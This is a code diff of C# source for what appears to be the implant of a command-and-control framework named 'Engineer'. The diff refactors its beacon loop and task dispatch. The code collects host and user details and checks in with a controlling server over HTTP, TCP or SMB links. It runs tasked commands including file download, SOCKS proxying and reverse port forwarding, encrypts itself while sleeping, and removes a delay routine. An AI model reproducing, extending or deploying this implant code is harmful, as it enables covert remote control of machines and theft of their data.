@@ -23,7 +23,7 @@ namespace Engineer
         internal static EngineerMetadata _metadata;
         internal static WindowsIdentity ImpersonatedUser;
         internal static bool ImpersonatedUserChanged = false;
-        private static List<EngineerCommand> _commands = new List<EngineerCommand>(); // Assigned here because its not assigned in main so assigning it somewhere else would localsize the assignment other 3 are assigned the objects in Main func.
+        internal static List<EngineerCommand> _commands = new List<EngineerCommand>(); // Assigned here because its not assigned in main so assigning it somewhere else would localsize the assignment other 3 are assigned the objects in Main func.
         internal static int InboundCommandsRec = 0;
         internal static int OutboundResponsesSent = 0;
         private static string ManagerType = "{{REPLACE_MANAGER_TYPE}}";
@@ -130,13 +130,10 @@ namespace Engineer
                     {
                         IsTaskExecuting = true;
                     }
-                    
+
                     //handle tasks
                     Thread.Sleep(1);
-                    if (_commModule.RecvData(out var tasks))
-                    {
-                        DealWithTasks(tasks);
-                    }
+
                     //send task output
                     if (!_commModule.Outbound.IsEmpty)
                     {
@@ -147,9 +144,13 @@ namespace Engineer
                         //get tasks
                         await _commModule.CheckIn();      //http checkin with server
                     }
+                    if (_commModule.RecvData(out var tasks))
+                    {
+                        Tasking.DealWithTasks(tasks);
+                    }
                     while (!_commModule.P2POutbound.IsEmpty && ManagerType.Equals("tcp", StringComparison.CurrentCultureIgnoreCase))
                     {
-                        Console.WriteLine("tcp engineer has p2p outbound to put in parents queue");
+                        //Console.WriteLine("tcp engineer has p2p outbound to put in parents queue");
                         EngTCPComm.ChildToParentData[TcpParentCommModules.Keys.ElementAt(0)].Enqueue(_commModule.P2POutbound.TryDequeue(out var data) ? data : null); //if this child has a finished task result place it into the queue for the parent to pick up
                     }
                     if (!_commModule.P2POutbound.IsEmpty && ManagerType.Equals("smb", StringComparison.CurrentCultureIgnoreCase))
@@ -184,13 +185,13 @@ namespace Engineer
                         //Console.WriteLine($"parent is connected? {_commModule.IsChildConnectedToParent}");
                         var checkTask = new EngineerTask() { Id = "checkin", Command = "checkin", IsBlocking = true };
                         InboundCommandsRec += 1;
-                        await DealWithTask(checkTask);
+                        await Tasking.DealWithTask(checkTask);
                     }
 
                     //sleep and encrypt
                     if (InboundCommandsRec == OutboundResponsesSent && EngCommBase.Sleep > 1000 && !(isInjected) && EngTCPComm.IsDataInTransit == false && EngSMBComm.IsDataInTransit == false)
                     {
-                        Console.WriteLine($"{DateTime.Now} No data to send and no task received encrypting");
+                        //Console.WriteLine($"{DateTime.Now} No data to send and no task received encrypting");
                         //Console.WriteLine($"tcp data in transit {EngTCPComm.IsDataInTransit}");
                         //Console.WriteLine($"smb data in transit {EngSMBComm.IsDataInTransit}");
                         IsEncrypted = true;
@@ -215,12 +216,15 @@ namespace Engineer
                         //    InboundCommandsRec += 1;
                         //    await DealWithTask(checkTask);
                         //}
-                        Console.WriteLine($"{DateTime.Now} Sleeping for {EngCommBase.Sleep} ms");
+                        //Console.WriteLine($"{DateTime.Now} Sleeping for {EngCommBase.Sleep} ms");
+                        Thread.Sleep(EngCommBase.Sleep);
+                    }
+                    else if(EngCommBase.Sleep > 1000)
+                    {
                         Thread.Sleep(EngCommBase.Sleep);
                     }
                     else
                     {
-                        //Thread.Sleep(5);
                         //should be executing a command or posting data not sleeping
                         //Console.WriteLine("executing a task?");
                     }
@@ -293,6 +297,7 @@ namespace Engineer
                 Id = Guid.NewGuid().ToString(),                             //takes guid from process and uses that string as the id
                 Hostname = Dns.GetHostName(),                         // getting the hostname of the machine
                 Address = Dns.GetHostAddresses(Dns.GetHostName()).LastOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork)?.ToString(), // getting the ip address of the machine
+                
                 Username = identity.Name,                                  // since identrity is info on the user the name here is just the username  
                 ProcessName = process.ProcessName,                         
                 ProcessId = process.Id,
@@ -311,94 +316,33 @@ namespace Engineer
             _tokenSource.Cancel();
         }
 
-        private static void DealWithTasks(IEnumerable<EngineerTask> tasks)
+        public void GetAddresses()
         {
-            foreach (var task in tasks)
-            {
-                //if task.IsBlocking is true then we need to wait for the task to finish before we can continue
-                if (task.IsBlocking)
-                {
-                    // Console.WriteLine("Blocking task executing");
-                    DealWithTask(task);
-                }
-                else
-                {
-                    //if task.IsBlocking is false then we can just start the task and continue
-                    Task.Run(async () => await DealWithTask(task));
-                }
-            }
+            //return a list of ip addresses that are part of the InterNetwork AddressFamily
+            var addresses = Dns.GetHostAddresses(Dns.GetHostName()).Where(a => a.AddressFamily == AddressFamily.InterNetwork).ToList();
         }
 
-        public static async Task DealWithTask(EngineerTask task)
+        public static void SendTaskResult(EngineerTaskResult taskResult)
         {
-            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command,StringComparison.CurrentCultureIgnoreCase)); //this should then take input and match too cmd list
-            if (command is null)
+            var NewtaskResult = new EngineerTaskResult
             {
-                var result = "Error: Command not found";
-                SendTaskResult(task.Id, result,false,EngTaskStatus.Failed);  //task we send in still has all properties including Id
-            }
-            else
-            {
-                var result = command.Execute(task);
-                //if command is download then call the Functions.DownloadTracker.SplitFileString function, get the filename from the task.Arguments, and pass the result to the function
-                if (task.Command.Equals("download", StringComparison.CurrentCultureIgnoreCase))
-                {
-                    task.Arguments.TryGetValue("/file",out string filename);
-                    Functions.DownloadTracker.SplitFileString(filename, result);
-                    //send each value from the key that matches the filename variable in _downloadedFileParts to the server
-                    foreach (var value in Functions.DownloadTracker._downloadedFileParts[filename])
-                    {
-                        SendTaskResult(task.Id, value, false,EngTaskStatus.Complete);
-                    }
-                }
-                //if Command name is ConnectSocks, SendSocks, ReceiveSocks send a true for ishidden
-                else if (task.Command.Equals("socksConnect", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("socksSend", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("socksReceive", StringComparison.CurrentCultureIgnoreCase))
-                {
-                    SendTaskResult(task.Id, result, true,EngTaskStatus.Complete);
-                }
-                else if(task.Command.Equals("FirstCheckIn", StringComparison.CurrentCultureIgnoreCase))
-                {
-                    Console.WriteLine($"first check in task {task.Id} complete");
-                    SendTaskResult(task.Id, result, true, EngTaskStatus.Complete);
-                }
-                else if (task.Command.Equals("CheckIn", StringComparison.CurrentCultureIgnoreCase))
-                {
-                    Console.WriteLine($" check in task {task.Id} complete");
-                    SendTaskResult(task.Id, result, true, EngTaskStatus.Complete);
-                }
-                else if (task.Command.Equals("rportsend", StringComparison.CurrentCultureIgnoreCase) ||task.Command.Equals("rportRecieve", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("rportforward", StringComparison.CurrentCultureIgnoreCase))
-                {
-                    Console.WriteLine($"task {task.Id} complete");
-                    SendTaskResult(task.Id, result, true, EngTaskStatus.Complete);
-                }
-                else
-                {
-                    Console.WriteLine($"{DateTime.Now} task {task.Id} complete");
-                    SendTaskResult(task.Id, result, false, EngTaskStatus.Complete);
-                }
-            }
-        }
-
-        private static void SendTaskResult(string taskid, string result, bool ishidden, EngTaskStatus taskStatus)
-        {
-            var taskResult = new EngineerTaskResult
-            {
-                Id = taskid,
-                Result = result,
-                IsHidden = ishidden,
-                Status = taskStatus,
-                EngineerId = _metadata.Id
+                Id = taskResult.Id,
+                Command = taskResult.Command,
+                Result = taskResult.Result,
+                IsHidden = taskResult.IsHidden,
+                Status = taskResult.Status,
+                EngineerId = taskResult.EngineerId
             };
             if (ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase))
             {
                 //Console.WriteLine("is http calling send data");
-                _commModule.SentData(taskResult);
+                _commModule.SentData(NewtaskResult);
             }
             else if (ManagerType.Equals("tcp", StringComparison.CurrentCultureIgnoreCase))
             {
                 Program.OutboundResponsesSent += 1;
                 //Console.WriteLine("is tcp seralizing task result");
-                IEnumerable<EngineerTaskResult> tempResult = new List<EngineerTaskResult> { taskResult };
+                IEnumerable<EngineerTaskResult> tempResult = new List<EngineerTaskResult> { NewtaskResult };
                 var SeraliedTaskResult = tempResult.ProSerialise();
                 var encryptedTaskResult = Encryption.AES_Encrypt(SeraliedTaskResult, "PlaceTaskKeyHereLater");
                 Console.WriteLine("calling p2p Sent");
@@ -408,7 +352,7 @@ namespace Engineer
             {
                 Program.OutboundResponsesSent += 1;
                 Console.WriteLine("is smb seralizing task result");
-                IEnumerable<EngineerTaskResult> tempResult = new List<EngineerTaskResult> { taskResult };
+                IEnumerable<EngineerTaskResult> tempResult = new List<EngineerTaskResult> { NewtaskResult };
                 var SeraliedTaskResult = tempResult.ProSerialise();
                 var encryptedTaskResult = Encryption.AES_Encrypt(SeraliedTaskResult, "PlaceTaskKeyHereLater");
                 Console.WriteLine("calling p2p Sent");
@@ -433,28 +377,7 @@ namespace Engineer
             }
             catch { }
         }
-        private static void PrimeCalc()
-        {// prime number calculations
-            var stopwatch = new System.Diagnostics.Stopwatch();
-            stopwatch.Start();
-            int prime2;
-
-            for (int i = 0; i <= 3; i++)
-            {
-                int prime1 = 998348479;
-                for (prime2 = 33478883; prime1 > 1; prime2++)
-                    if (prime1 % prime2 == 0)
-                    {
-                        int x = 0;
-                        while (prime1 % prime2 == 0)
-                        {
-                            prime1 /= 2;
-                            x++;
-                        }
-                    }
-            }
-            stopwatch.Stop();
-        }
+        
         
     }
 }
